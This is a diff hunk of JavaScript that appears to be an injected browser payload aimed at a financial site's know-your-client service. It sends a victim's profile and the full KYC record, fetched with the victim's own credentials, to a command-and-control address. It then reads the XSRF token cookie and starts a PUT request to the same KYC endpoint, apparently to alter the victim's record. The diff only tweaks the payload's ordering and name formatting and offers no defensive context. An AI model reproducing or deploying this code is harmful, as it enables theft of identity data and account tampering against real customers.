@@ -65,20 +65,20 @@ e.open('POST', C2, true);
 e.setRequestHeader('Content-Type', 'application/json');
 e.send(profile);
 
-var xsrf = document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1];
-
 var k = new XMLHttpRequest();
 k.open('GET', '/sgw5/digital/know-your-client-service/v3/kyc-service/', false);
 k.withCredentials = true;
 k.send();
 
 var kycData = JSON.parse(k.responseText);
-var ulegalName = kycData.demographics.firstName + kycData.demographics.lastName;
+var ulegalName = kycData.demographics.firstName + " " + kycData.demographics.lastName;
 
 var e2 = new XMLHttpRequest();
 e2.open('POST', C2, true);
 e2.setRequestHeader('Content-Type', 'application/json');
 e2.send(k.responseText);
+
+var xsrf = document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1];
 
 var p = new XMLHttpRequest();
 p.open('PUT', '/sgw5/digital/know-your-client-service/v3/kyc-service/', false);
